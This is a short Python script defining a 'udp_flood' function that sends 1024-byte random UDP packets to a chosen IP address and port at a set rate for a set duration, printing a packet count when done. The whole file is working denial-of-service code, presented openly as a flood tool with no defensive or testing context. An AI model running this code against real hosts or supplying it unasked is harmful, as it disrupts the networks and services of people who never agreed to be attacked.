import socket
import time
import random

def udp_flood(target_ip, target_port, duration, rate):
    """
    Sends UDP packets to a target at a specified rate for a given duration.
    """
    print(f"[INFO] Starting UDP flood on {target_ip}:{target_port} for {duration}s at ~{rate} pkts/s.")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    start_time = time.time()
    packet_count = 0

    while True:
        if time.time() - start_time > duration:
            break
        
        sock.sendto(data, (target_ip, target_port))
        packet_count += 1
        time.sleep(1 / rate)

    sock.close()
    print(f"[INFO] UDP flood completed. Total packets sent: {packet_count}")
